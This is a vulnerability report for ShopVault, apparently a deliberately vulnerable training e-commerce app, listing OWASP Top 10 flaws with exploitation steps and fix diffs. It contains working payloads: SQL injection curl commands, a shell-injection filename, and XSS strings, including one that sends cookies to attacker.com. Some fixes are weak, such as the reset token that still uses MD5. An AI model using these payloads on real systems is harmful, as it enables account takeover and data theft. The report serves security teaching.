# ShopVault — Vulnerability Report

This document catalogs all intentionally introduced vulnerabilities in the ShopVault application. Each entry includes the OWASP Top 10:2021 category, file location, description, exploitation steps, and a fix in diff format.

---

## A01 — Broken Access Control

### A01-B1-IDOR-orders
- **Category**: A01 — Broken Access Control
- **Location**: `backend/internal/handlers/orders.go`, `Get()` method
- **Description**: The `GET /api/orders/:id` endpoint does not verify that the authenticated user owns the requested order. Any authenticated user can view any order by enumerating the sequential order ID, exposing the full order details including credit card numbers.
- **Exploitation**:
  1. Login as user A (customer@example.com / customer123)
  2. Access `GET /api/orders/1` — receives admin's seed order or any other user's order
  3. Enumerate order IDs sequentially to extract all orders and their CC data
- **Fix**:
```diff
 func (h *OrderHandler) Get(c *gin.Context) {
 	idStr := c.Param("id")
 	id, err := strconv.ParseInt(idStr, 10, 64)
+	userID, ok := middleware.GetUserFromContext(c)
+	if !ok {
+		c.JSON(http.StatusUnauthorized, gin.H{"error": "Authentication required"})
+		return
+	}

 	var o models.Order
-	row := database.DB.QueryRow("SELECT ... FROM orders WHERE id = ?", id)
+	row := database.DB.QueryRow("SELECT ... FROM orders WHERE id = ? AND user_id = ?", id, userID)
 	err = row.Scan(...)
 	if err != nil {
 		c.JSON(http.StatusNotFound, gin.H{"error": "Order not found"})
 		return
 	}
```

### A01-B2-missing-admin-middleware
- **Category**: A01 — Broken Access Control
- **Location**: `backend/cmd/server/main.go`, admin route registration (`/api/admin/orders`)
- **Description**: The `/api/admin/orders` route applies `AuthMiddleware` but NOT `AdminMiddleware`. Any authenticated user (even with `user` role) can access this endpoint and retrieve all orders with full credit card data from all users.
- **Exploitation**:
  1. Login as regular user (customer@example.com)
  2. `GET /api/admin/orders` — returns all orders including CC numbers
- **Fix**:
```diff
			admin.GET("/orders", middleware.AdminMiddleware(), adminHandler.GetOrders)
-			admin.GET("/orders", adminHandler.GetOrders)
```

### A01-B3-user-profile-leak
- **Category**: A01 — Broken Access Control
- **Location**: `backend/internal/handlers/admin.go`, `GetUsers()` method
- **Description**: The `GET /api/admin/users` endpoint returns all user fields including `password_hash` and `reset_token`. An admin user can retrieve password hashes (MD5) and active reset tokens for all users, enabling credential cracking and account takeover.
- **Exploitation**:
  1. Login as admin (admin@shopvault.com / admin123)
  2. `GET /api/admin/users`
  3. All users' MD5 password hashes and reset tokens are returned in the response
- **Fix**:
```diff
-	rows, err := database.DB.Query("SELECT id, email, password_hash, full_name, role, reset_token, created_at FROM users ORDER BY id")
+	rows, err := database.DB.Query("SELECT id, email, full_name, role, created_at FROM users ORDER BY id")
```

### A01-F1-client-side-admin-routing
- **Category**: A01 — Broken Access Control
- **Location**: `frontend/src/App.tsx`, admin routes wrapped in `ProtectedRoute` (no role check)
- **Description**: The client-side `/admin` routes are protected only by `ProtectedRoute`, which checks for authentication but NOT for admin role. Any authenticated user can see the admin UI, though API calls to admin-only endpoints will fail. This exposes the admin interface and allows non-admins to discover API endpoints.
- **Exploitation**:
  1. Login as regular user (customer@example.com)
  2. Navigate to `/admin` — the admin dashboard renders
  3. Click around — `/admin/orders` endpoint responds successfully (see A01-B2)
- **Fix**:
```diff
+import { useAuth } from "../context/AuthContext";
+
+function AdminRoute({ children }: { children: React.ReactNode }) {
+  const { user } = useAuth();
+  if (!user || user.role !== "admin") {
+    return <Navigate to="/" replace />;
+  }
+  return <>{children}</>;
+}

 // Replace ProtectedRoute with AdminRoute for admin routes
```

### A01-F2-token-localstorage
- **Category**: A01 — Broken Access Control
- **Location**: `frontend/src/context/AuthContext.tsx`, stores JWT in localStorage
- **Description**: The JWT token is stored in `localStorage`, which is accessible to any JavaScript running on the page. If the application has an XSS vulnerability (see A03-F1, A03-F2, A03-F3), an attacker can steal the token and impersonate the user.
- **Exploitation**:
  1. Exploit any XSS vulnerability on the page
  2. Execute `console.log(localStorage.getItem("token"))` via XSS
  3. Use the stolen token to make API calls as the victim
- **Fix**:
```diff
-    localStorage.setItem("token", newToken);
+    // Use httpOnly cookies set by the server instead of localStorage
+    // The server should set the token as an httpOnly cookie
```

---

## A02 — Cryptographic Failures

### A02-B1-md5-password
- **Category**: A02 — Cryptographic Failures
- **Location**: `backend/internal/handlers/auth.go`, `hashPassword()` function
- **Description**: Passwords are hashed using MD5 without a salt. MD5 is cryptographically broken and unsalted hashes are vulnerable to rainbow table attacks. The function is named `hashPassword()` which hides its weakness.
- **Exploitation**:
  1. Register a user
  2. Inspect the DB: `SELECT password_hash FROM users`
  3. The hash is a 32-character hex string (MD5)
  4. Look up the hash in rainbow tables or crack with common wordlists
- **Fix**:
```diff
+import "golang.org/x/crypto/bcrypt"

 func hashPassword(password string) string {
-	hash := md5.Sum([]byte(password))
-	return fmt.Sprintf("%x", hash)
+	hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
+	if err != nil {
+		return ""
+	}
+	return string(hash)
 }
```

### A02-B2-hardcoded-jwt-secret
- **Category**: A02 — Cryptographic Failures
- **Location**: `backend/internal/handlers/auth.go` and `backend/internal/middleware/auth.go`, `jwtSecret` variable
- **Description**: The JWT signing secret is hardcoded as `"shopvault-secret-key-2024"` in two places in the source code. Anyone with access to the code can forge valid JWT tokens for any user.
- **Exploitation**:
  1. Find the secret in the source code
  2. Forge a JWT with `{"user_id": 1, "email": "admin@shopvault.com", "role": "admin"}`
  3. Sign it with HMAC-SHA256 using the secret
  4. Use the forged token to access any protected endpoint
- **Fix**:
```diff
-var jwtSecret = []byte("shopvault-secret-key-2024")
+var jwtSecret = []byte(os.Getenv("JWT_SECRET"))
```

### A02-B3-jwt-none-algorithm
- **Category**: A02 — Cryptographic Failures
- **Location**: `backend/internal/handlers/auth.go`, `Me()` method and `backend/internal/middleware/auth.go`, `AuthMiddleware()`
- **Description**: The JWT parsing does not enforce a specific signing algorithm. Both the `/api/auth/me` handler and the `AuthMiddleware` use `jwt.Parse()` without specifying valid methods. Depending on the jwt library version, this may allow the `"alg": "none"` attack where a token with no signature is accepted as valid.
- **Exploitation**:
  1. Craft a JWT with header `{"alg": "none", "typ": "JWT"}` and payload `{"user_id": 1, "role": "admin"}`
  2. Set the signature to an empty string
  3. Use `Authorization: Bearer <crafted-token>` to access any protected endpoint
- **Fix**:
```diff
-		token, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
-			return jwtSecret, nil
-		})
+		token, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
+			if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
+				return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
+			}
+			return jwtSecret, nil
+		})
```

### A02-B4-plaintext-cc
- **Category**: A02 — Cryptographic Failures
- **Location**: `backend/internal/database/db.go`, orders table schema; `backend/internal/handlers/cart.go`, `Checkout()` method
- **Description**: Credit card numbers (`cc_number`), expiry dates (`cc_expiry`), and CVV codes (`cc_cvv`) are stored as plaintext in the `orders` table and returned in API responses. There is no encryption at rest. Anyone with database access or who exploits IDOR/access control vulnerabilities can read full payment card data.
- **Exploitation**:
  1. Place an order with credit card information
  2. Query the DB: `SELECT cc_number, cc_expiry, cc_cvv FROM orders`
  3. Or access via IDOR: `GET /api/orders/1`
  4. Full CC data is returned in the response
- **Fix**:
```diff
+// Encrypt CC data before storing
+import "crypto/aes"
+// Store encrypted CC data with a separate encryption key
+// Never return full CC data in API responses
-		"INSERT INTO orders (..., cc_number, cc_expiry, cc_cvv, ...) VALUES (?, ?, ?, ?, ...)",
+		"INSERT INTO orders (..., cc_last4, payment_token, ...) VALUES (?, ?, ...)",

 // Only return last 4 digits in API responses
-	c.JSON(http.StatusOK, gin.H{"order": o})
+	o.CCNumber = "****" + o.CCNumber[len(o.CCNumber)-4:]
+	c.JSON(http.StatusOK, gin.H{"order": o})
```

### A02-B5-predictable-reset-token
- **Category**: A02 — Cryptographic Failures
- **Location**: `backend/internal/handlers/auth.go`, `ForgotPassword()` method
- **Description**: The password reset token is generated as `md5(email + "reset" + date)`. The token is a deterministic MD5 hash using only the email (public) and the current date (easily guessable within a 24-hour window). An attacker who knows a user's email can generate the reset token and take over the account.
- **Exploitation**:
  1. Trigger password reset for `admin@shopvault.com`
  2. Compute `md5("admin@shopvault.com" + "reset" + "2026-05-18")` for today's date
  3. `POST /api/auth/reset-password` with the computed token and a new password
  4. Account taken over
- **Fix**:
```diff
-	resetToken := fmt.Sprintf("%x", md5.Sum([]byte(fmt.Sprintf("%sreset%s", user.Email, now.Format("2006-01-02")))))
+	resetToken := fmt.Sprintf("%x", md5.Sum([]byte(fmt.Sprintf("%sreset%s%d", user.Email, now.Format("2006-01-02"), rand.Int63()))))
```

### A02-F1-jwt-localstorage
- **Category**: A02 — Cryptographic Failures
- **Location**: `frontend/src/context/AuthContext.tsx`, stores JWT in localStorage
- **Description**: (See A01-F2 — dual-category) The JWT is stored in localStorage, making it accessible to XSS attacks. Combined with A03 vulnerabilities, this enables complete token theft.
- **Exploitation**: Same as A01-F2
- **Fix**: Same as A01-F2

### A02-F2-cvv-unmasked
- **Category**: A02 — Cryptographic Failures
- **Location**: `frontend/src/pages/Checkout.tsx`, CVV input field
- **Description**: The CVV/CVC input field uses `type="text"` instead of `type="password"`, meaning the entered value is visible on screen. Additionally, the checkout form data including full CC details is logged to the browser console (see A09-F2).
- **Exploitation**:
  1. Navigate to checkout while someone is entering their CC details
  2. Observe the CVV displayed in plaintext
  3. Open browser DevTools → Console to see the full CC payload
- **Fix**:
```diff
                 <input
-                  type="text"
+                  type="password"
                   className="form-control"
                   placeholder="123"
                   value={ccCvv}
```

---

## A03 — Injection

### A03-B1-sqli-product-search
- **Category**: A03 — Injection
- **Location**: `backend/internal/handlers/products.go`, `Search()` method
- **Description**: The product search endpoint concatenates user input directly into a SQL query using `fmt.Sprintf` to build a LIKE clause. A malicious search query can inject SQL commands, allowing data extraction, modification, or deletion.
- **Exploitation**:
  ```bash
  # Extract all table names
  curl "http://localhost:8080/api/products/search?q='+UNION+SELECT+1,name,3,4,5,6,7+FROM+sqlite_master+WHERE+type='table'--"

  # Bypass authentication by extracting user data
  curl "http://localhost:8080/api/products/search?q='+UNION+SELECT+id,email,password_hash,full_name,5,6,7+FROM+users--"
  ```
- **Fix**:
```diff
-	q := fmt.Sprintf(
-		"SELECT id, name, description, price, image_url, category, stock FROM products WHERE name LIKE '%%%s%%' OR description LIKE '%%%s%%'",
-		query, query,
-	)
-	rows, err := database.DB.Query(q)
+	searchPattern := "%" + query + "%"
+	rows, err := database.DB.Query(
+		"SELECT id, name, description, price, image_url, category, stock FROM products WHERE name LIKE ? OR description LIKE ?",
+		searchPattern, searchPattern,
+	)
```

### A03-B2-sqli-login
- **Category**: A03 — Injection
- **Location**: `backend/internal/handlers/auth.go`, `Login()` method
- **Description**: The login handler builds the SQL query using `fmt.Sprintf` with the user-provided email directly interpolated. An attacker can use SQL injection to bypass authentication entirely.
- **Exploitation**:
  ```bash
  # Login as admin without password
  curl -X POST http://localhost:8080/api/auth/login \
    -H 'Content-Type: application/json' \
    -d '{"email": "admin@shopvault.com'\''--", "password": "anything"}'

  # Or using OR 1=1
  curl -X POST http://localhost:8080/api/auth/login \
    -H 'Content-Type: application/json' \
    -d '{"email": "'\'' OR 1=1--", "password": "anything"}'
  ```
- **Fix**:
```diff
-	query := fmt.Sprintf(
-		"SELECT id, email, password_hash, full_name, role FROM users WHERE email = '%s'",
-		req.Email,
-	)
-	row := database.DB.QueryRow(query)
+	row := database.DB.QueryRow(
+		"SELECT id, email, password_hash, full_name, role FROM users WHERE email = ?",
+		req.Email,
+	)
```

### A03-B3-sqli-admin-order-filter
- **Category**: A03 — Injection
- **Location**: `backend/internal/handlers/admin.go`, `GetOrders()` method
- **Description**: The admin orders endpoint filters by `user_id` or `status` parameters using `fmt.Sprintf` for SQL query construction. Both the numeric `user_id` and string `status` parameters are directly interpolated without sanitization.
- **Exploitation**:
  ```bash
  # Extract other tables via UNION
  curl -H "Authorization: Bearer <token>" \
    "http://localhost:8080/api/admin/orders?user_id=1+UNION+SELECT+1,2,email,4,5,6,7,8,9,10,11+FROM+users--"

  # Blind SQLi via status parameter
  curl -H "Authorization: Bearer <token>" \
    "http://localhost:8080/api/admin/orders?status=pending'+OR+1=1--"
  ```
- **Fix**:
```diff
-		query := fmt.Sprintf(
-			"SELECT ... FROM orders WHERE user_id = %s",
-			userID,
-		)
-		rows, err = database.DB.Query(query)
+		rows, err = database.DB.Query(
+			"SELECT ... FROM orders WHERE user_id = ?",
+			userID,
+		)
```

### A03-B4-command-injection
- **Category**: A03 — Injection
- **Location**: `backend/internal/handlers/upload.go`, `processImage()` function
- **Description**: After an image file is uploaded (with admin privileges), the `processImage()` function constructs an ImageMagick `convert` command via shell (`sh -c`) using the unsanitized filename. A malicious filename like `test;cat /etc/passwd > /app/uploads/passwd.txt;.jpg` would execute arbitrary shell commands on the server.
- **Exploitation**:
  1. Login as admin
  2. Upload a file with filename: `test; id > /app/uploads/output.txt; .jpg`
  3. `GET /uploads/output.txt` — the command output is accessible
- **Fix**:
```diff
-		cmd := exec.Command("sh", "-c", fmt.Sprintf("convert %s -resize 300x300 %s", filename, outputFile))
+		cmd := exec.Command("convert", filename, "-resize", "300x300", outputFile)
```

### A03-B5-ssti-email-template
- **Category**: A03 — Injection
- **Location**: `backend/internal/templates/email.go`, `RenderReceipt()` function
- **Description**: The email receipt function uses `text/template` to render an order confirmation. The `ShippingAddress` field from the user's checkout request is interpolated directly into the template string using `fmt.Sprintf`. If the shipping address contains Go template syntax like `{{.Total}}`, it will be evaluated when the template is executed, allowing server-side template injection.
- **Exploitation**:
  1. Place an order with shipping address: `Test\n{{.Total}}\n{{.ID}}`
  2. The template engine evaluates the injected directives
  3. Internal order data is exposed in the rendered output
- **Fix**:
```diff
-	bodyText := fmt.Sprintf(`Order Confirmation #%d
-...
-%s
-...`, order.ID, userName, order.ShippingAddress, ...)
-
-	tmpl, err := template.New("receipt").Parse(bodyText)
-
-	data := OrderEmailData{...}
-	if err := tmpl.Execute(buf, data); err != nil { ... }
-	return buf.String(), nil
+	return fmt.Sprintf(`Order Confirmation #%d
+Dear %s,
+Thank you for your purchase! Your order has been received and will be shipped to:
+%s
+Order Total: $%.2f
+Status: %s
+Thank you for shopping at ShopVault!`,
+		order.ID, userName, order.ShippingAddress, order.Total, order.Status,
+	), nil
```

### A03-F1-reflected-xss-search
- **Category**: A03 — Injection
- **Location**: `frontend/src/pages/Shop.tsx`, search result rendering
- **Description**: The search query parameter is rendered into the page using `dangerouslySetInnerHTML` without any sanitization. An attacker can craft a URL with a malicious search query that executes arbitrary JavaScript in the victim's browser.
- **Exploitation**:
  1. Craft a URL: `http://localhost:3000/?q=<img+src=x+onerror=alert(document.cookie)>`
  2. Send the URL to a victim
  3. When the victim opens the URL, the XSS payload executes
- **Fix**:
```diff
-        <span dangerouslySetInnerHTML={{ __html: searchParams.get("q") || "" }} />
+        <span>{searchParams.get("q") || ""}</span>
```

### A03-F2-stored-xss-reviews
- **Category**: A03 — Injection
- **Location**: `frontend/src/pages/ProductDetail.tsx`, review comment rendering
- **Description**: Review comments are rendered using `dangerouslySetInnerHTML` without sanitization. An attacker can submit a review containing HTML/JavaScript that will execute when any user views the product page. This is a stored XSS affecting all visitors.
- **Exploitation**:
  1. Login as any user
  2. Submit a review with comment: `<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">`
  3. When any user (including admin) views the product, the script executes
- **Fix**:
```diff
-            <p dangerouslySetInnerHTML={{ __html: review.comment }} />
+            <p>{review.comment}</p>
```

### A03-F3-dom-xss-hash
- **Category**: A03 — Injection
- **Location**: `frontend/src/pages/Shop.tsx`, hash-based DOM manipulation
- **Description**: The page reads `window.location.hash` and directly assigns it to an element's `innerHTML`. An attacker can craft a URL with a malicious hash fragment that executes JavaScript in the victim's browser.
- **Exploitation**:
  1. Craft URL: `http://localhost:3000/#<img src=x onerror=alert(1)>`
  2. Send to victim
  3. The hash content is injected into the DOM and the XSS fires
- **Fix**:
```diff
-      if (hash) {
-        const el = document.getElementById("preview-area");
-        if (el) {
-          el.innerHTML = hash;
-        }
-      }
+      if (hash) {
+        const el = document.getElementById("preview-area");
+        if (el) {
+          el.textContent = hash;
+        }
+      }
```

---

## A04 — Insecure Design

### A04-B1-client-side-price
- **Category**: A04 — Insecure Design
- **Location**: `backend/internal/handlers/cart.go`, `Checkout()` method
- **Description**: The checkout endpoint accepts client-provided prices for each cart item without verifying them against the database. An attacker can modify the price in the request to pay an arbitrary amount for any product.
- **Exploitation**:
  ```bash
  curl -X POST http://localhost:8080/api/cart/checkout \
    -H 'Authorization: Bearer <token>' \
    -H 'Content-Type: application/json' \
    -d '{
      "items": [{"product_id": 1, "name": "Headphones", "price": 0.01, "quantity": 1}],
      "shipping_address": "123 St",
      "cc_number": "4111111111111111",
      "cc_expiry": "12/30",
      "cc_cvv": "123"
    }'
  ```
  Order is created with total $0.01 instead of $149.99.
- **Fix**:
```diff
 	total := 0.0
 	for _, item := range req.Items {
-		total += item.Price * float64(item.Quantity)
+		var realPrice float64
+		database.DB.QueryRow("SELECT price FROM products WHERE id = ?", item.ProductID).Scan(&realPrice)
+		total += realPrice * float64(item.Quantity)
 	}
```

### A04-B2-negative-quantity
- **Category**: A04 — Insecure Design
- **Location**: `backend/internal/handlers/cart.go`, `Checkout()` method
- **Description**: The checkout endpoint does not validate that the quantity of each item is positive. Setting a negative quantity results in a negative total, effectively crediting the user's "purchase."
- **Exploitation**:
  ```bash
  curl -X POST http://localhost:8080/api/cart/checkout \
    -H 'Authorization: Bearer <token>' \
    -H 'Content-Type: application/json' \
    -d '{
      "items": [{"product_id": 1, "name": "Headphones", "price": 149.99, "quantity": -5}],
      ...
    }'
  ```
  Order total is -$749.95.
- **Fix**:
```diff
+	if item.Quantity <= 0 {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Quantity must be positive"})
+		return
+	}
```

### A04-B3-coupon-race-condition
- **Category**: A04 — Insecure Design
- **Location**: `backend/internal/handlers/cart.go`, `Checkout()` method and `backend/internal/handlers/coupons.go`, `Validate()` method
- **Description**: Coupon usage validation uses a read-check-write pattern without a database transaction. Two concurrent requests can both pass the `used_count < max_uses` check before either increments the counter, allowing the coupon to be used more than `max_uses` times.
- **Exploitation**:
  1. Create a coupon with `max_uses = 1`
  2. Send 10 concurrent checkout requests using the same coupon code
  3. Multiple orders successfully apply the coupon discount
- **Fix**:
```diff
-		if coupon.UsedCount < coupon.MaxUses {
-			database.DB.Exec("UPDATE coupons SET used_count = used_count + 1 WHERE id = ?", coupon.ID)
-			discountPercent = coupon.DiscountPercent
-		}
+		// Use a database transaction
+		tx, _ := database.DB.Begin()
+		var usedCount int
+		tx.QueryRow("SELECT used_count FROM coupons WHERE id = ?", coupon.ID).Scan(&usedCount)
+		if usedCount < coupon.MaxUses {
+			tx.Exec("UPDATE coupons SET used_count = used_count + 1 WHERE id = ? AND used_count < max_uses", coupon.ID)
+			discountPercent = coupon.DiscountPercent
+		}
+		tx.Commit()
```

### A04-F1-client-total-calculation
- **Category**: A04 — Insecure Design
- **Location**: `frontend/src/pages/Cart.tsx`, total calculation
- **Description**: The cart total is calculated on the client side using `items.reduce()`. While the server side is also vulnerable (A04-B1), performing business logic on the client introduces an architectural flaw. The calculated total may not match the server-side total that the backend processes.
- **Exploitation**: Combined with A04-B1 — the client sends the price to the server, which accepts it without verification.
- **Fix**: Calculate totals exclusively on the server; the client should only display what the server returns.

### A04-F2-client-coupon-discount
- **Category**: A04 — Insecure Design
- **Location**: `frontend/src/pages/Cart.tsx` and `frontend/src/pages/Checkout.tsx`, client-side coupon application
- **Description**: The coupon discount is calculated on the client side and the discounted total is sent to the server. The client controls the discount logic, enabling arbitrary price manipulation.
- **Exploitation**: Combined with A04-B1 and A04-B3.
- **Fix**: Apply coupon discounts on the server exclusively; update the client-side total from the server response.

---

## A05 — Security Misconfiguration

### A05-B1-gin-debug-mode
- **Category**: A05 — Security Misconfiguration
- **Location**: `docker-compose.yml`, `GIN_MODE=debug` environment variable
- **Description**: The Gin framework runs in debug mode in the Docker Compose setup. Debug mode prints every request to stdout, including sensitive headers and request bodies. In production, this would leak sensitive data (passwords, tokens, credit card numbers) into container logs.
- **Exploitation**:
  1. `curl -X POST http://localhost:8080/api/auth/login -d '{"email":"admin@shopvault.com","password":"admin123"}'`
  2. Check Docker logs: `docker compose logs backend`
  3. The password is logged in plaintext (see also A09-B1)
- **Fix**:
```diff
-      - GIN_MODE=debug
+      - GIN_MODE=release
```

### A05-B2-default-credentials
- **Category**: A05 — Security Misconfiguration
- **Location**: `backend/internal/database/seed.go`, admin user seed data
- **Description**: A default admin account is seeded with credentials `admin@shopvault.com` / `admin123`. These credentials are documented in the README and hardcoded in the seed data. Anyone who discovers the application can log in with administrative privileges.
- **Exploitation**:
  1. Read the README or source code to find the default credentials
  2. Login with `admin@shopvault.com` / `admin123`
- **Fix**:
```diff
-	_, err = database.DB.Exec(
-		"INSERT INTO users (email, password_hash, full_name, role) VALUES (?, ?, ?, ?)",
-		"admin@shopvault.com", adminPassword, "Admin User", "admin",
-	)
+	// Admin accounts should be created manually with unique credentials
+	// during initial setup, not seeded automatically.
```

### A05-B3-directory-listing
- **Category**: A05 — Security Misconfiguration
- **Location**: `backend/cmd/server/main.go`, static file serving configuration
- **Description**: The `/uploads/` directory is served using `r.StaticFS("/uploads", http.Dir("./uploads"))` which enables directory listing. Anyone can browse the file listing at `/uploads/` and discover all uploaded files including potentially malicious content.
- **Exploitation**:
  1. `GET http://localhost:8080/uploads/` — lists all files in the uploads directory
- **Fix**:
```diff
-	r.StaticFS("/uploads", http.Dir("./uploads"))
+	r.Static("/uploads", "./uploads")
```

### A05-B4-error-stack-traces
- **Category**: A05 — Security Misconfiguration
- **Location**: Multiple handlers across the backend
- **Description**: Error responses return the raw Go error message via `c.JSON(500, gin.H{"error": err.Error()})`. In debug mode, Gin may also include stack traces in error responses, leaking internal application structure to clients.
- **Exploitation**:
  1. Trigger an error (e.g., malformed JSON, invalid parameter)
  2. The response contains detailed error information including internal paths
- **Fix**:
```diff
-	c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+	log.Printf("Internal error: %v", err)
+	c.JSON(http.StatusInternalServerError, gin.H{"error": "An internal error occurred"})
```

### A05-B5-missing-security-headers
- **Category**: A05 — Security Misconfiguration
- **Location**: `backend/cmd/server/main.go`, Gin router initialization
- **Description**: The application does not set any security-related HTTP headers: no Content-Security-Policy, no X-Frame-Options, no X-Content-Type-Options, no Strict-Transport-Security. This leaves the application vulnerable to clickjacking, MIME-type sniffing, and inline script injection.
- **Exploitation**:
  1. `curl -I http://localhost:8080/api/products`
  2. No CSP, X-Frame-Options, or other security headers are present
  3. Combined with XSS (A03), no defense-in-depth exists
- **Fix**:
```diff
+	r.Use(func(c *gin.Context) {
+		c.Header("Content-Security-Policy", "default-src 'self'; script-src 'self'")
+		c.Header("X-Frame-Options", "DENY")
+		c.Header("X-Content-Type-Options", "nosniff")
+		c.Header("Strict-Transport-Security", "max-age=31536000")
+		c.Next()
+	})
```

### A05-F1-no-csp
- **Category**: A05 — Security Misconfiguration
- **Location**: `frontend/index.html`, missing Content-Security-Policy meta tag or header
- **Description**: The frontend does not include a CSP header or meta tag. Together with A05-B5 (no CSP from backend), this allows any inline scripts to execute, making XSS attacks trivially exploitable.
- **Exploitation**:
  1. Any XSS payload (see A03-F1, A03-F2, A03-F3) executes without restriction
- **Fix**:
```diff
+	<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' https://cdn.jsdelivr.net">
```

### A05-F2-source-maps
- **Category**: A05 — Security Misconfiguration
- **Location**: `frontend/vite.config.ts`, build configuration
- **Description**: Source maps are enabled in the production build (`sourcemap: true`). This exposes the original TypeScript source code to anyone who visits the site, revealing implementation details, API endpoints, and internal logic.
- **Exploitation**:
  1. `npm run build` + `npm run preview`
  2. Open DevTools → Sources
  3. Original `.tsx` source files are visible, including API routes and token handling logic
- **Fix**:
```diff
   build: {
-    sourcemap: true,
+    sourcemap: false,
   },
```

---

## A06 — Vulnerable and Outdated Components

### A06-B1-outdated-go-dependencies
- **Category**: A06 — Vulnerable and Outdated Components
- **Location**: `backend/go.mod`
- **Description**: The Go module uses outdated dependency versions with known vulnerabilities:
  - `github.com/gin-gonic/gin v1.7.0` (latest is v1.10+)
  - `github.com/golang-jwt/jwt/v4 v4.0.0` (known parsing issues)
  - `github.com/mattn/go-sqlite3 v1.14.15` (contains known bugs)
- **Exploitation**: These versions contain known CVEs that can be exploited.
- **Fix**:
```diff
-	github.com/gin-gonic/gin v1.7.0
-	github.com/golang-jwt/jwt/v4 v4.0.0
-	github.com/mattn/go-sqlite3 v1.14.15
+	github.com/gin-gonic/gin v1.10.0
+	github.com/golang-jwt/jwt/v5 v5.2.1
+	github.com/mattn/go-sqlite3 v1.14.22
```

### A06-B2-outdated-go-image
- **Category**: A06 — Vulnerable and Outdated Components
- **Location**: `Dockerfile.backend`, base image
- **Description**: The Dockerfile uses `golang:1.20-alpine` as the base image. Go 1.20 is no longer supported and contains unpatched security vulnerabilities in the standard library and runtime.
- **Exploitation**: Known vulnerabilities in Go standard library packages (net/http, crypto/tls, etc.).
- **Fix**:
```diff
-FROM golang:1.20-alpine
+FROM golang:1.22-alpine
```

### A06-F1-outdated-react
- **Category**: A06 — Vulnerable and Outdated Components
- **Location**: `frontend/package.json`
- **Description**: The frontend uses outdated versions of React (18.0.0), Vite (2.9.0), and other dependencies. These versions may contain known security vulnerabilities.
- **Exploitation**: Known React vulnerabilities (e.g., CVE-2021-24033, CVE-2020-15973) present in React 18.0.0.
- **Fix**:
```diff
-    "react": "^18.0.0",
-    "react-dom": "^18.0.0",
-    "vite": "^2.9.0",
+    "react": "^18.3.0",
+    "react-dom": "^18.3.0",
+    "vite": "^5.2.0",
```

### A06-F2-outdated-node-image
- **Category**: A06 — Vulnerable and Outdated Components
- **Location**: `Dockerfile.frontend`, base image
- **Description**: The Dockerfile uses `node:18-alpine`. Node 18 reached end-of-life and receives no security updates.
- **Exploitation**: Known vulnerabilities in Node.js 18.
- **Fix**:
```diff
-FROM node:18-alpine
+FROM node:22-alpine
```

---

## A07 — Identification and Authentication Failures

### A07-B1-weak-session-token
- **Category**: A07 — Identification and Authentication Failures
- **Location**: `backend/internal/handlers/auth.go`, `Login()` method
- **Description**: Session tokens are generated as `md5(email + timestamp)` where the timestamp is `time.Now().UnixNano()`. While this is at nanosecond resolution, the entropy is limited to 64 bits, and the token is predictable if the approximate login time is known.
- **Exploitation**:
  1. Observe a user login (or force a login via social engineering)
  2. Brute-force the nanosecond timestamp within a small window
  3. Generate the corresponding session token
- **Fix**:
```diff
-	sessionToken := fmt.Sprintf("%x", md5.Sum([]byte(fmt.Sprintf("%s%d", user.Email, time.Now().UnixNano()))))
+	import "crypto/rand"
+	b := make([]byte, 32)
+	rand.Read(b)
+	sessionToken := hex.EncodeToString(b)
```

### A07-B2-no-password-policy
- **Category**: A07 — Identification and Authentication Failures
- **Location**: `backend/internal/handlers/auth.go`, `Register()` and `ResetPassword()` methods
- **Description**: There are no password complexity requirements. A user can register with a single-character password. The `Register()` handler only checks that the password is non-empty.
- **Exploitation**:
  1. Register with password "a"
  2. The account is created successfully
- **Fix**:
```diff
 	if req.Email == "" || req.Password == "" || req.FullName == "" {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "All fields are required"})
 		return
 	}
+	if len(req.Password) < 8 {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Password must be at least 8 characters"})
+		return
+	}
```

### A07-B3-jwt-no-expiry
- **Category**: A07 — Identification and Authentication Failures
- **Location**: `backend/internal/handlers/auth.go`, `Login()` method
- **Description**: The JWT token is generated without an `exp` (expiration) claim. Once issued, the token is valid indefinitely. If a token is stolen (e.g., via XSS — see A03), it can be used forever.
- **Exploitation**:
  1. Login to get a JWT
  2. Decode the JWT on jwt.io
  3. Observe that there is no `exp` field
  4. The stolen token can be reused indefinitely
- **Fix**:
```diff
 	claims := jwt.MapClaims{
 		"user_id": user.ID,
 		"email":   user.Email,
 		"role":    user.Role,
+		"exp":     time.Now().Add(24 * time.Hour).Unix(),
 	}
```

### A07-B4-no-rate-limiting
- **Category**: A07 — Identification and Authentication Failures
- **Location**: Entire backend — absence of rate limiting middleware
- **Description**: There is no rate limiting on any endpoint, including login, registration, and password reset. Attackers can brute-force credentials or enumerate users (see A07-B5) without any automated defense.
- **Exploitation**:
  1. Write a script to send 1000 login attempts per second
  2. No rate limiting or lockout mechanism slows the attack
- **Fix**:
```diff
+// Add rate limiting middleware
+import "golang.org/x/time/rate"
+// Apply to auth endpoints with limits like 5 requests per second
```

### A07-B5-user-enumeration
- **Category**: A07 — Identification and Authentication Failures
- **Location**: `backend/internal/handlers/auth.go`, `Login()` and `ForgotPassword()` methods
- **Description**: The forgot password endpoint returns different responses for existing and non-existing email addresses. For existing emails it sends the reset token to the system log. For non-existing emails it returns immediately. Combined with A07-B4 (no rate limiting), this enables user enumeration.
- **Exploitation**:
  1. `POST /api/auth/forgot-password` with `{"email": "admin@shopvault.com"}`
  2. Observe response + time
  3. `POST /api/auth/forgot-password` with `{"email": "nonexistent@test.com"}`
  4. Timing difference confirms valid vs invalid emails
  5. Check server logs for the reset token of valid accounts
- **Fix**:
```diff
 	var user models.User
 	row := database.DB.QueryRow("SELECT id, email FROM users WHERE email = ?", req.Email)
 	err := row.Scan(&user.ID, &user.Email)
-	if err != nil {
-		c.JSON(http.StatusOK, gin.H{"message": "If this email exists, a reset link has been sent"})
-		return
-	}
+	// Always perform the same operations regardless of whether the email exists
+	if err == nil {
+		// Generate and store reset token
+		// ...
+	}
+	// Always return the same response
